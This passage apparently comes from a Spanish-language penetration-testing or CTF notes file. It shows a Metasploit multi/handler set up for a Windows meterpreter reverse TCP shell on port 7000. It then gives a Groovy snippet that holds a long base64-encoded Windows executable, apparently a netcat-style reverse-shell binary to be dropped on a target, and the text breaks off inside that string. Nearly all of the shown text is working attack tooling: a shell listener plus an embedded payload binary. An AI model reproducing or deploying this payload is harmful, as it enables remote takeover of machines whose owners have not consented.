[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf exploit(multi/handler) > set lport 7000
lport => 7000
msf exploit(multi/handler) > run
```


![[Pasted image 20260121222457.png]]\


```bash
import java.util.Base64

// Tu base64 original del EXE
def base64String = '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